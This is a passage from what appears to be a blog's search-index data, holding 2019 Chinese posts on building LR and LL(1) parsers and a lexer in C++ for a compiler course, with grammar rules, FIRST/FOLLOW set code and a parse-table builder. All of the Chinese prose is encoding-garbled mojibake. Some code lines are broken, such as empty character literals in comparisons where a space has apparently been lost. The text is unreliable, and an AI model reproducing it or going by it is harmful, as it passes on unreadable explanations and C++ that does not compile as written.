go_to[stoi(s.top())][nt[rules[num].first]]; s.push(rules[num].first); s.push(to_string(tmp)); } else { // mistake cout \u003c\u003c\" è¯­æ³•é”™è¯¯ï¼Œç¬¬ \"\u003c\u003c line-1 \u003c\u003c\" è¡Œï¼Œç¼ºå°‘ \\\";\\\"\" \u003c\u003c endl; input = \";\" + input; } } } ","date":"2019-05-15","objectID":"/lr-parser/:2:5","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è¾“å‡º ç›¸å¯¹ç®€å•ï¼Œä½†ä¹Ÿæœ‰å‘ã€‚é¦–å…ˆ E ä¾ç„¶è¦ç‰¹åˆ¤ï¼Œè¾“å‡ºæ—¶ä¸èƒ½è¾“å‡ºï¼Œè€Œä¸”è¿˜è¦ â€œå€’æ‰£â€ ä¸€ä¸ªå­—ç¬¦ã€‚ ç„¶åæ˜¯è¿™é‡Œåœ¨æ›¿æ¢ï¼ˆä¹Ÿå°±æ˜¯å½’çº¦ï¼‰å­ä¸²æ—¶ï¼Œç”¨äº† rfind æ–¹æ³•å®šä½è€Œä¸æ˜¯ findï¼Œå› ä¸ºæ˜¯æœ€å³æ¨å¯¼å˜›ã€‚ void output() { string output = start_symbol; pair\u003cstring, string\u003e rule; cout \u003c\u003coutput \u003c\u003c\" =\u003e \"; for (string::size_type i = out.size()-1; i \u003e 0; --i) { rule = rules[out[i]]; string new_str = (rule.second ==\"E\"?\"\": rule.second); // deal with E and ws output.replace(output.rfind(rule.first), rule.first.size() + (rule.second ==\"E\"), new_str); cout \u003c\u003cendl \u003c\u003c output \u003c\u003c\" =\u003e \"; } rule = rules[out[0]]; cout \u003c\u003cendl \u003c\u003c output.replace(output.rfind(rule.first), rule.first.size(), rule.second) \u003c\u003c\" \"; } ","date":"2019-05-15","objectID":"/lr-parser/:2:6","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‘ç‚¹ éƒ½æ˜¯èƒ½è®©äººè¿·æƒ‘ä¸€æ®µæ—¶é—´çš„å‘ï¼Œè¿™å°±æ˜¯ LR è¯­æ³•åˆ†ææ›´éš¾çš„åœ°æ–¹å§ï¼š å·¦é€’å½’æ–‡æ³• FIRST é›†çš„æ‡’è®¡ç®—å¤„ç† é—­åŒ…å‡½æ•°å·¦å³éç»ˆç»“ç¬¦ç›¸åŒçš„æƒ…å†µå¤„ç† çŠ¶æ€å»é‡ E ä¸èƒ½ç®—ä½œä¸€ä¸ªç¬¦å· è¾“å‡ºæ—¶ E çš„ç‰¹åˆ¤ æ›¿æ¢æœ€å³ç«¯çš„é‚£ä¸ªå­ä¸² ","date":"2019-05-15","objectID":"/lr-parser/:3:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LR è¯­æ³•åˆ†æå™¨","uri":"/lr-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è¿™æ¬¡ç¹æ‚äº†è®¸å¤šï¼Œæˆ‘æœ‰ç‚¹å®³æ€•æ¥ä¸‹æ¥çš„ LR(1) è¯­æ³•åˆ†æå™¨äº†ã€‚ ","date":"2019-05-09","objectID":"/ll-parser/:0:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ¦‚è¿° è¿™æ¬¡éœ€è¦ç”¨ LL(1) æ–¹æ³•ä¹Ÿå°±æ˜¯è‡ªé¡¶å‘ä¸‹æ–¹æ³•å®ç°è¯­æ³•åˆ†æå™¨ï¼Œå¹¶ä¸”éœ€è¦è¯†åˆ«å¹¶æ”¹æ­£ç®€å•çš„è¯­æ³•é”™è¯¯ï¼ˆè¿™é‡Œåªå‡ºç°äº†æ¼åˆ†å·çš„é”™è¯¯ï¼‰ã€‚ä¸¾ä¸ªæ —å­ï¼Œè¾“å…¥ï¼š { while (ID == NUM) { ID = NUM } } éœ€è¦æŒ‰è¿™ä¸ªæ ¼å¼è¾“å‡ºï¼š è¯­æ³•é”™è¯¯, ç¬¬ 4 è¡Œ, ç¼ºå°‘ \";\" program compoundstmt { stmts stmt whilestmt while ( boolexpr arithexpr multexpr simpleexpr ID multexprprime E arithexprprime E boolop == arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ) stmt compoundstmt { stmts stmt assgstmt ID = arithexpr multexpr simpleexpr NUM multexprprime E arithexprprime E ; stmts E } stmts E } éµå¾ªçš„è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯ CFG çš„äº§ç”Ÿå¼æ˜¯ï¼š program -\u003e compoundstmt stmt -\u003e ifstmt | whilestmt | assgstmt | compoundstmt compoundstmt -\u003e {stmts} stmts -\u003e stmt stmts | E ifstmt -\u003e if (boolexpr) then stmt else stmt whilestmt -\u003e while (boolexpr) stmt assgstmt -\u003e ID = arithexpr ; boolexpr -\u003e arithexpr boolop arithexpr boolop -\u003e \u003c|\u003e | \u003c= |\u003e= | == arithexpr -\u003e multexpr arithexprprime arithexprprime -\u003e + multexpr arithexprprime | - multexpr arithexprprime | E multexpr -\u003e simpleexpr multexprprime multexprprime -\u003e * simpleexpr multexprprime | / simpleexpr multexprprime | E simpleexpr -\u003e ID | NUM | (arithexpr) æ³¨æ„åˆ°è¿™é‡Œé¢å·²ç»æ¶ˆé™¤äº†å·¦é€’å½’ï¼Œä¹Ÿæ²¡æœ‰å…¬å…±å·¦å› å­ï¼ˆæœ€åå‘ç°ä¹Ÿæ²¡æœ‰äºŒä¹‰æ€§ï¼‰ï¼Œéå¸¸èˆ’æœã€‚ èµ·å§‹ç¬¦æ˜¯ programï¼Œä¿ç•™å­—æœ‰ï¼š { } ( ) if then else while ID NUM \u003e \u003c=\u003e= \u003c= == + - * / E æ˜¯ 'ç©º' ","date":"2019-05-09","objectID":"/ll-parser/:1:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ€è·¯ä¸ä»£ç  å…¶å®å‘ä¸å¤šï¼Œä½†æ˜¯å®¹æ˜“è‡ªå·±ç»™è‡ªå·±æŒ–å‘ï¼Œä¾‹å¦‚æŠ„è§„åˆ™æŠŠè§„åˆ™æŠ„é”™ç­‰ï¼Œå…¶å®å¾ˆéš¾å‘ç°ã€‚ ","date":"2019-05-09","objectID":"/ll-parser/:2:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‡†å¤‡å·¥ä½œ é¦–å…ˆæˆ‘ä»¬éœ€è¦å°†äº§ç”Ÿå¼å­˜ä¸‹æ¥ã€‚ç”±äºäº§ç”Ÿå¼æœ¬èº«æ˜¯ä¸€ç§æ˜ å°„å…³ç³»ï¼Œå®¹æ˜“æƒ³åˆ°ç”¨ map å­˜å‚¨ã€‚å› ä¸ºæ‡’å¾—å¤„ç† |ï¼Œç›´æ¥æŠŠç”¨ | åˆ†éš”çš„äº§ç”Ÿå¼æ‹†å¼€ã€‚è¿™æ ·ä¸€æ¥ï¼Œäº§ç”Ÿå¼å·¦è¾¹çš„éç»ˆç»“ç¬¦å°±å¯èƒ½å‡ºç°å¤šæ¬¡ï¼Œå› æ­¤æœ€ç»ˆä½¿ç”¨äº† multimapã€‚ const multimap\u003cstring, string\u003e rules = { {\"program\", \"compoundstmt\"}, {\"stmt\", \"ifstmt\"}, {\"stmt\", \"whilestmt\"}, {\"stmt\", \"assgstmt\"}, {\"stmt\", \"compoundstmt\"}, {\"compoundstmt\", \"{ stmts}\"}, {\"stmts\", \"stmt stmts\"}, {\"stmts\", \"E\"}, {\"ifstmt\", \"if ( boolexpr) then stmt else stmt\"}, {\"whilestmt\", \"while ( boolexpr) stmt\"}, {\"assgstmt\", \"ID = arithexpr ;\"}, {\"boolexpr\", \"arithexpr boolop arithexpr\"}, {\"boolop\", \"\u003c\"}, {\"boolop\", \"\u003e\"}, {\"boolop\", \"\u003c=\"}, {\"boolop\", \"\u003e=\"}, {\"boolop\", \"==\"}, {\"arithexpr\", \"multexpr arithexprprime\"}, {\"arithexprprime\", \"+ multexpr arithexprprime\"}, {\"arithexprprime\", \"- multexpr arithexprprime\"}, {\"arithexprprime\", \"E\"}, {\"multexpr\", \"simpleexpr multexprprime\"}, {\"multexprprime\", \"* simpleexpr multexprprime\"}, {\"multexprprime\", \"/ simpleexpr multexprprime\"}, {\"multexprprime\", \"E\"}, {\"simpleexpr\", \"ID\"}, {\"simpleexpr\", \"NUM\"}, {\"simpleexpr\", \"( arithexpr)\"} /*{\"e\",\"t e'\"}, {\"e'\",\"+ t e'\"}, {\"e'\",\"E\"}, {\"t\", \"f t'\"}, {\"t'\",\"* f t'\"}, {\"t'\",\"E\"}, {\"f\", \"( e)\"}, {\"f\", \"id\"}*/ }; æœ€åè¢«æ³¨é‡Šæ‰çš„éƒ¨åˆ†æ˜¯ä¸€ä¸ªæ›´ç®€å•çš„ CFGï¼Œåœ¨åé¢æ£€éªŒ FIRST é›†ã€FOLLOW é›†å’Œåˆ†æè¡¨æ—¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å…ˆå¤„ç†è¿™ä¸ªç®€å• CFG çš„æƒ…å†µè¦å®¹æ˜“å¾—å¤šã€‚ æ¥ä¸‹æ¥æ˜¯å­˜å‚¨ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦ã€‚åŸæœ¬çš„æƒ³æ³•æ˜¯é‡‡ç”¨æ•°ç»„ï¼Œä½†æ˜¯ä»”ç»†æƒ³ä¸€æƒ³ï¼Œæˆ‘ä»¬å­˜å‚¨æ‰€æœ‰ç»ˆç»“ç¬¦å’Œéç»ˆç»“ç¬¦æ˜¯ä¸ºäº†åšä»€ä¹ˆï¼Ÿ å› ä¸ºè¿™äº›ç¬¦å·éœ€è¦ä½œä¸º LL åˆ†æè¡¨çš„è¡Œå’Œåˆ—ï¼Œè¿™æ„å‘³ç€å¯¹äºä»»æ„ä¸€ä¸ªç¬¦å·ï¼Œæˆ‘ä»¬å°†éœ€è¦ç¡®å®šå®ƒåœ¨å¯¹åº”é›†åˆä¸­çš„ä½ç½®ï¼Œä»¥ä¾¿åœ¨åˆ†æè¡¨ä¸­æ’å…¥æ¡ç›®ã€‚è€Œåˆ†æè¡¨é‡‡ç”¨ä»€ä¹ˆæ•°æ®ç»“æ„æœ€åˆé€‚ï¼Ÿç®€ä¾¿èµ·è§ï¼Œæˆ‘ä»¬é‡‡ç”¨äº†äºŒç»´æ•°ç»„ï¼Œè¿™æ ·æ–¹ä¾¿æˆ‘ä»¬ç”¨ table[non_terminal_pos][terminal_pos] æ¥å”¯ä¸€ç¡®å®šè¡¨çš„æ¡ç›®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªé›†åˆéœ€è¦æ˜¯æœ‰åºçš„ï¼Œå› ä¸ºåˆ†æè¡¨æ˜¯æœ‰åºçš„ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜çŸ¥é“ï¼šæ•°ç»„ä¸‹æ ‡å¿…é¡»æ˜¯æ•°å­—ï¼›ç»ˆç»“ç¬¦å’Œéç»ˆç»“ç¬¦éƒ½æ˜¯å”¯ä¸€çš„ã€‚ ç”¨ set å’Œ map éƒ½å¯ä»¥æ»¡è¶³æœ‰åºæ€§ï¼ˆå·æ‡’èµ·è§ï¼Œæˆ‘å½“ç„¶ä¸æƒ³åœ¨æ’å…¥æ—¶è‡ªå·±è€ƒè™‘é¡ºåºé—®é¢˜ï¼Œè€Œä¼˜å…ˆé˜Ÿåˆ—å¹¶ä¸é€‚åˆéšæœºè®¿é—®ï¼‰å’Œå”¯ä¸€æ€§ã€‚ç„¶è€Œï¼ŒäºŒè€…éƒ½ä¼šåŸºäºç»ˆç»“ç¬¦å’Œéç»ˆç»“ç¬¦çš„å­—å…¸åºæ’åºï¼Œè¦æ‰¾åˆ°ä¸€ä¸ªç¬¦å·æˆ‘ä»¬å¿…é¡»ä½¿ç”¨ find æ–¹æ³•ã€‚è¿™æ ·ä¹Ÿè®¸ä¸ä¼šæœ‰ä»€ä¹ˆæ•ˆç‡é—®é¢˜ï¼Œä½†ä¸å¤Ÿä¼˜é›…ã€‚ ä½†æˆ‘ä»¬å…¶å®å¯ä»¥å¼ºè¡Œè§„å®šä¸€ä¸ªé¡ºåºï¼Œä»è€Œæ— è§†åŸæ¥çš„æ’åºï¼Œåƒè¿™æ ·ï¼š map\u003cstring, int\u003e nt = { // non-terminals, the map below is terminals {\"program\", 0}, {\"stmt\", 1}, {\"compoundstmt\", 2}, {\"stmts\", 3}, {\"ifstmt\", 4}, {\"whilestmt\", 5}, {\"assgstmt\", 6}, {\"boolexpr\", 7}, {\"boolop\", 8}, {\"arithexpr\", 9}, {\"arithexprprime\", 10}, {\"multexpr\", 11}, {\"multexprprime\", 12}, {\"simpleexpr\", 13} /*{\"e\", 0}, {\"e'\", 1}, {\"t\", 2}, {\"t'\", 3}, {\"f\", 4}*/ }; map\u003cstring, int\u003e t = { {\"{\", 0}, {\"}\", 1}, {\"(\", 2}, {\")\", 3}, {\"if\", 4}, {\"then\", 5}, {\"else\", 6}, {\"while\", 7}, {\"ID\", 8}, {\"=\", 9}, {\"\u003e\", 10}, {\"\u003c\", 11}, {\"\u003e=\", 12}, {\"\u003c=\", 13}, {\"==\", 14}, {\"+\", 15}, {\"-\", 16}, {\"*\", 17}, {\"/\", 18}, {\"NUM\", 19}, {\"E\", 20}, {\";\", 21}, {\"$\", 22} /*{\"+\", 0}, {\"*\", 1}, {\"(\", 2}, {\")\", 3}, {\"id\", 4}, {\"E\", 5}, {\"$\", 6}*/ }; å¥½å§ï¼Œè¿™æ ·ä¹Ÿç®—ä¸ä¸Šä¼˜é›…ã€‚ æœ€åæ˜¯å­˜å‚¨åˆ†æè¡¨ï¼Œå¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œæˆ‘é‡‡ç”¨äº†äºŒç»´ string æ•°ç»„çš„æ–¹å¼ï¼Œæ•°ç»„å†…åªå­˜å‚¨äº§ç”Ÿå¼å³è¾¹çš„å­—ç¬¦ä¸²ï¼Œå› ä¸ºäº§ç”Ÿå¼å·¦è¾¹å¿…å®šæ˜¯è¯¥è¡Œå¯¹åº”çš„éç»ˆç»“ç¬¦ã€‚ ","date":"2019-05-09","objectID":"/ll-parser/:2:1","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è®¡ç®— FIRST é›†å’Œ FOLLOW é›† é¦–å…ˆè¦è€ƒè™‘çš„é—®é¢˜ä¾ç„¶æ˜¯ï¼Œç”¨ä»€ä¹ˆæ•°æ®ç»“æ„å­˜å‚¨è¿™ä¸¤ä¸ªé›†åˆï¼Ÿ ä»¥ FIRST é›†ä¸ºä¾‹ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç¬¦å·çš„ FIRST é›†æ˜¯ç”±å¤šä¸ªç»ˆç»“ç¬¦ç»„æˆçš„é›†åˆã€‚åŒä¸€é›†åˆä¸­ï¼Œè¿™äº›ç»ˆç»“ç¬¦ä¸ä¼šé‡å¤ï¼Œè€Œä¸”æˆ‘ä»¬å¹¶ä¸å…³å¿ƒå®ƒä»¬çš„é¡ºåºã€‚å„ç§æ“ä½œçš„å¤æ‚åº¦ä¸º O(1) çš„ unordered_set æ— ç–‘æ˜¯æœ€ä½³é€‰æ‹©äº†ã€‚éšåå†åˆ©ç”¨ map å»ºç«‹ç¬¦å·ä¸å…¶ FIRST ä¹‹é—´çš„è”ç³»ã€‚ typedef unordered_set\u003cstring\u003e str_set; map\u003cstring, str_set\u003e FIRST, FOLLOW; FIRST é›†å’Œ FOLLOW é›†çš„å…·ä½“è®¡ç®—æ–¹æ³•è¿™é‡Œä¸å†èµ˜è¿°ã€‚ä½†å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå®ƒä»¬çš„å…±é€šä¹‹å¤„æ˜¯éƒ½é€šè¿‡å¾ªç¯æ¥æ›´æ–°é›†åˆæœ¬èº«ï¼Œç›´åˆ°é›†åˆä¸å†å‘ç”Ÿå˜åŒ–ã€‚è€Œåœ¨è¿™é‡Œçš„ä»£ç ä¸­ï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå†™äº†ä¸ªé€’å½’ç‰ˆæœ¬ã€‚ FIRST é›†ï¼š /* Whether there's a rule lhs -\u003e rhs */ bool exist_rule(const string \u0026lhs, const string \u0026rhs) { for (auto iter = rules.lower_bound(lhs); iter != rules.upper_bound(lhs); ++iter) { if (iter-\u003esecond == rhs) { return true; } } return false; } /* Compute FIRST[expr] recursively */ str_set compute_first(const string \u0026expr) { if (!FIRST[expr].empty()) { // Already calculated return FIRST[expr]; } if (exist_rule(expr,\"E\")) { FIRST[expr].insert(\"E\"); } string y_n; // X -\u003e y_1 y_2 ... y_n ... stringstream ss; str_set tmp; for (auto iter = rules.lower_bound(expr); iter != rules.upper_bound(expr); ++iter) { ss.clear(); ss.str(iter-\u003esecond); while (ss\u003e\u003e y_n) { tmp = compute_first(y_n); if (!tmp.count(\"E\")) { FIRST[expr].insert(tmp.begin(), tmp.end()); // the same as set_union() in std::set break; } } } return FIRST[expr]; } lowerbound å’Œ upperbound çœŸçš„å¥½ç”¨ã€‚å¦å¤–è¦æ³¨æ„çš„æ˜¯ unordered_set ä¸èƒ½ç”¨ set_union æ–¹æ³•ï¼Œåªèƒ½ä»å¤´åˆ°å°¾å…¨éƒ¨ insertã€‚ä¸»å‡½æ•°ä¸­è®¡ç®—ä»£ç ï¼š // Init FIRST str_set tmp; for (const auto \u0026expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp)); } for (const auto \u0026expr: nt) { compute_first(expr.first); } FOLLOW é›†ï¼š /* Starting from start_pos, return the next consecutive substr without ws */ string next_str(string str, string::size_type start_pos) { if (start_pos\u003e str.size()) { return \"E\"; // for FIRST[\"E\"] = {\"E\"} } string::size_type end_pos = str.find_first_of(\" \\n\\t\", start_pos); if (end_pos == string::npos) { end_pos = str.size(); } return str.substr(start_pos, end_pos - start_pos); } /* Compute FOLLOW[expr] recursively */ str_set compute_follow(const string \u0026expr) { if (follow_visited.count(expr)) { return FOLLOW[expr]; } follow_visited.insert(expr); // mark as visited string::size_type pos, end; str_set tmp, first_beta; for (const auto \u0026sspair: rules) { for (pos = 0; (pos = sspair.second.find(expr, pos)) != string::npos; pos = end) { // expr found in rhs end = pos + expr.size(); if ((end == sspair.second.size() || sspair.second[end] == '') \u0026\u0026 (pos == 0 || sspair.second[pos-1] == '')) { // for u-know-y if (end == sspair.second.size()) { // At tail tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } else { // Not at tail, but E is in FIRST[string that follows] first_beta = FIRST[next_str(sspair.second, end+1)]; if (first_beta.count(\"E\")) { tmp = compute_follow(sspair.first); FOLLOW[expr].insert(tmp.begin(), tmp.end()); } // Everything in FIRST[beta] is in FOLLOW[expr] except E(see outside the loop) FOLLOW[expr].insert(first_beta.begin(), first_beta.end()); } } } } FOLLOW[expr].erase(\"E\"); return FOLLOW[expr]; } FOLLOW é›†çš„é€’å½’è¾¹ç•Œä¸èƒ½åƒ FIRST é›†ä¸€æ ·ç®€å•ç²—æš´ï¼Œæ‰€ä»¥æˆ‘è®¾ç½®äº†ï¼š str_set follow_visited; // if FOLLOW[str] has been computed æ¥è®°å½•è¯¥ç¬¦å·çš„ FOLLOW é›†æ˜¯å¦å·²ç»è¢«è®¡ç®—è¿‡ã€‚è¿™æ˜¯å› ä¸ºå­˜åœ¨è¿™æ ·ä¸€ç»„ç•¥æœ‰äº›æ£˜æ‰‹çš„ â€œå³é€’å½’â€ çš„æ–‡æ³•ï¼š stmt -\u003e ifstmt | whilestmt | assgstmt | compoundstmt ifstmt -\u003e if (boolexpr) then stmt else stmt äºæ˜¯ï¼Œç›¸åº”çš„ä¸»å‡½æ•°è®¡ç®—ä»£ç ä¹Ÿè¦æ”¹ï¼š prog += \"$\"; // Init FOLLOW tmp.clear(); tmp.insert(\"$\"); FOLLOW.insert(make_pair(\"program\", tmp)); for (int i = 0; i \u003c 2; ++i) { follow_visited.clear(); for (const auto \u0026expr: nt) { compute_follow(expr.first); } } å…¶ä¸­ prog æ˜¯è¯»å…¥çš„ç¨‹åºå­—ç¬¦ä¸²ã€‚ æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹è®¡ç®—æ˜¯å¦æ­£ç¡®ï¼š /* Test if FIRST and FOLLOW are correct */ void ff_test() { for (const auto \u0026expr: nt) { cout \u003c\u003c expr.first \u003c\u003c\" :: \"; for (const string \u0026s: FIRST[expr.first]) { cout \u003c\u003c s \u003c\u003c\", \"; } cout \u003c\u003c\" :: \"; for (const string \u0026s: FOLLOW[expr.first]) { cout \u003c\u003c s \u003c\u003c\", \"; } cout \u003c\u003c endl; } } ","date":"2019-05-09","objectID":"/ll-parser/:2:2","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ„é€  LL åˆ†æè¡¨ å¤„ç†å¥½ä¸‹æ ‡ï¼Œç›´æ¥å¥—ç®—æ³•å°±å®Œæˆäº†ã€‚è¿™é‡Œå°±å‡¸æ˜¾å‡ºå‰é¢ nt å’Œ t é‡‡ç”¨ map\u003cstring, int\u003e å­˜å‚¨çš„ä¼˜åŠ¿ï¼Œä½¿å¾—ç”±ä¸€ä¸ªç¬¦å·æ‰¾åˆ°å®ƒå¯¹åº”äºè¡¨ä¸­çš„ä½ç½®ååˆ†æ–¹ä¾¿ã€‚ æ³¨æ„ï¼šåœ¨ nt ä¸­æˆ‘æŠŠ $ ä¹Ÿå½“ä½œç»ˆç»“ç¬¦å¤„ç†ï¼Œè¿™æ ·åœ¨ä»£ç ä¸­çš„ step 3 å°±ä¸ç”¨æ‹†æˆä¸¤æ­¥äº†ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚ä½†å®é™…ä¸Š $ æ—¢ä¸æ˜¯ç»ˆç»“ç¬¦ä¹Ÿä¸æ˜¯éç»ˆç»“ç¬¦ã€‚ /* Construct the LL parsing table */ void construct_table() { str_set first_alpha, follow_alpha; int A; // for all rules A -\u003e alpha for (const auto \u0026sspair: rules) { first_alpha = FIRST[next_str(sspair.second, 0)]; follow_alpha = FOLLOW[sspair.first]; A = nt[sspair.first]; // step 2(unfortunately index must be number) for (const auto \u0026terminal: t) { if (first_alpha.count(terminal.first) \u0026\u0026 terminal.first != \"E\") { table[A][t[terminal.first]] = sspair.second; } } if (first_alpha.count(\"E\")) { // step 3 for (const string\u0026 b: follow_alpha) { table[A][t[b]] = sspair.second; } } } } æµ‹è¯•ä¸€ä¸‹ï¼ˆé’ˆå¯¹è¾ƒç®€å• CFG æƒ…å†µå†™çš„ï¼‰ï¼š /* Test if the parsing table is correct */ void table_test() { cout \u003c\u003c\"+ * () id E $\" \u003c\u003c endl; for (int i = 0; i \u003c 5; ++i) { for (int j = 0; j \u003c 7; ++j) { cout \u003c\u003ctable[i][j] \u003c\u003c\" | \"; } cout \u003c\u003c endl; } } ","date":"2019-05-09","objectID":"/ll-parser/:2:3","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"è¿›è¡Œè¯­æ³•åˆ†æ æœ¬æ¥æ˜¯æƒ³ç”¨ stack å®ç°çš„ï¼Œä½†æ˜¯ä¸€çœ‹éœ€è¦çš„è¾“å‡ºï¼Œå¾ˆæ˜¾ç„¶ç”¨ç­‰ä»·çš„é€’å½’æ˜¯æ›´æ–¹ä¾¿çš„ã€‚ éšåï¼Œæ³¨æ„åˆ°è¯­æ³•é”™è¯¯éœ€è¦åœ¨ä¸€å¼€å§‹è¾“å‡ºï¼Œè€Œå¦‚æœé€’å½’å¤„ç†æ˜¯ä¼šè¾¹å¤„ç†è¾¹è¾“å‡ºçš„ï¼Œå› æ­¤è€ƒè™‘æ‰«æä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ä¸è¾“å‡ºï¼Œä½†å½“å‘ç°è¯­æ³•é”™è¯¯åè¾“å‡ºæç¤ºä¿¡æ¯å¹¶ä¸å†æ‰«æï¼›ç¬¬äºŒæ¬¡æ‰è¾¹å¤„ç†è¾¹è¾“å‡ºã€‚æ‰€ä»¥åŠ äº† bool scan å‚æ•°ï¼Œscan == true è¡¨ç¤ºå¤„äºç¬¬ä¸€æ¬¡çš„ â€œæ‰«ææ¨¡å¼â€ã€‚ /* This func can both scan the prog to find mistakes and do the parsing */ void parse(const string top, int tab_cnt, bool scan) { if (!scan) { if (top !=\"program\") { cout \u003c\u003c endl; for (int i = 0; i \u003c tab_cnt; ++i) { cout \u003c\u003c\"\\t\"; } } cout \u003c\u003c top; } else { if (flag) return; } string input_top = next_str(input, 0); if (top == input_top) { string::size_type start = input.find_first_not_of(\" \\n\\t\", input_top.size()); if (scan \u0026\u0026 input.substr(0, start).find('\\n') != string::npos) { // in scan mode, when we're bypassing a \\n ++line; } // get rid of input_top input = input.substr(start); return; } else if (top ==\"E\") { // in case of unnecessary trouble return; } else if (scan \u0026\u0026 t.count(top)) { // in scan mode, top is a terminal but cannot match input_top, indicating a mistake cout \u003c\u003c\" è¯­æ³•é”™è¯¯, ç¬¬ \"\u003c\u003c line-1 \u003c\u003c\" è¡Œ, ç¼ºå°‘ \\\"\" \u003c\u003c top \u003c\u003c\"\\\"\" \u003c\u003c endl; string::size_type ins = prog.find(input); // find the insertion point prog.insert(ins,\" \"+ top +\" \"); // fix the mistake flag = true; // stop scanning return; } string rhs = table[nt[top]][t[input_top]]; string cur; stringstream ss(rhs); while (ss\u003e\u003e cur) { parse(cur, tab_cnt + 1, scan); } } éœ€è¦å…¨å±€å˜é‡ï¼š string input; int line = 1; bool flag; // if the scanning is over ä¸»å‡½æ•°ä¸­ï¼Œå°±åªéœ€è¦ï¼š // Scan, then parse input = prog; parse(\"program\", 0, true); input = prog; parse(\"program\", 0, false); ","date":"2019-05-09","objectID":"/ll-parser/:2:4","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å‘ç‚¹ å¦‚æœä¸ä»è¾ƒç®€å•çš„æƒ…å†µå¼€å§‹ï¼Œä¼šå¾ˆå®¹æ˜“å‡ºé”™ ç©ºç™½ç¬¦ï¼ˆ\\n \\tï¼‰çš„å¤„ç†ï¼Œä¸€å®šè¦å¤åˆ¶è¾“å…¥è€Œä¸æ˜¯æ‰‹æ‰“ï¼Œä¸ç„¶ä¼šåƒæˆ‘ä¸€æ ·è¢«å‘ä¸¤ä¸‰ä¸ªå°æ—¶ â€œå³é€’å½’â€ çš„å­˜åœ¨ä½¿å¾— FOLLOW é›†è®¡ç®—å¾ˆå®¹æ˜“å‡ºé”™ï¼Œè€Œçœ‹èµ·æ¥åƒæ˜¯å¯¹çš„ï¼ˆè¿™é‡Œæ„Ÿè§‰é€’å½’çš„æ–¹æ³•ä¸å¦‚å¾ªç¯ï¼‰ è¡Œæ•°ç»Ÿè®¡ å®šä½é”™è¯¯åœ¨åŸæ¥ç¨‹åºå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¹¶ä¿®å¤ ","date":"2019-05-09","objectID":"/ll-parser/:3:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"LL è¯­æ³•åˆ†æå™¨","uri":"/ll-parser/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å¥‡æ€ªçš„æ€è·¯æœç„¶æ€»æ˜¯é€šå‘å¥‡æ€ªçš„å‡ºè·¯ã€‚ ","date":"2019-04-11","objectID":"/lex-analysis/:0:0","tags":["C/C++","ç¼–è¯‘åŸç†"],"title":"èµ°è¿œäº†çš„è¯æ³•åˆ†æå™¨","uri":"/lex-analysis/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æ¦‚è¿° ç¼–è¯‘åŸç†è¯¾çš„å®è®­é¢˜ï¼Œéš¾åº¦æ˜¯ä¸å¤§çš„ï¼Œç„¶è€Œæˆ‘è‡ªä½œèªæ˜åœ°ç”¨ stringstream å¼ºè¡Œç»™è‡ªå·±å¢åŠ äº†éš¾åº¦â€¦â€¦ å®é™…ä¸Šï¼Œå³ä½¿å¢åŠ äº†è¿™ç‚¹éš¾åº¦ï¼Œè¿™æ¬¡å®è®­ä¾ç„¶ä¸éš¾ï¼Œç„¶è€Œæœ‰ä¸¤ä¸ªå¤©å‘ï¼š å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œè¯¸å¦‚ %d çš„å­—ç¬¦ï¼Œéœ€è¦å°†å…¶è§†ä¸ºä¸€ä¸ªè¯ç´  æ³¨é‡Šä¹Ÿè¢«ç®—ä½œè¯ç´ ï¼Œéœ€è¦è¢«æ‰“å°å‡ºæ¥ 